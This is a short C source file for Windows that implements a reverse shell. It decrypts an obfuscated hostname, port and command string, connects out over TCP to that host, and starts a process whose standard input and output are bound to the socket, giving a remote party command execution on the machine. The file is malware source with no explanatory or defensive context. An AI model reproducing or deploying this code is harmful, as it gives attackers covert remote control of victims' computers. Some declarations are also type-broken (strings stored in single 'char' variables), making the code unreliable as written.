#include <winsock2.h>
#include <stdio.h>
#include "../encryption/enc.h"
#pragma comment(lib,"ws2_32")


WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
          

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    char iv4 = Decrypt("enpjbHl9e39zZnhy");
    char p4 = Decrypt("cnNhcw==");  
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host; 
    host = gethostbyname(iv4);
    strcpy_s(iv4, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(p4));
    hax.sin_addr.s_addr = inet_addr(iv4);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    char* cmd = Decrypt("KC41bC0zJg==");

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}